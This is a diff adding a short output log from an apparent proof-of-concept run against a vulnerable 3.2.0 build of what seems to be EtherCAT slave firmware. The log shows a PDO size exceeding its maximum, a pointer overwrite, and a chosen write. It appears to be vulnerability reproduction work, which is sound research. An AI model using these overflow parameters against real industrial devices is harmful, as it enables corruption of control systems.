@@ -1,0 +1,7 @@
+# PDO overflow — vulnerable 3.2.0 plain build
+# command: ./build/pdo_overflow_3.2.0
+sizeOfPDO=64 nmappings=2 MAX_RXPDO_SIZE=42
+ESC_SM2_sml=64
+before: SMmap2[0].obj=0x59974b1b80c0 target0=00
+after:  SMmap2[0].obj=0x59974b1ba400 target0=4d target_last=4d
+verdict: ptr_overwrite=1 chosen_write=1
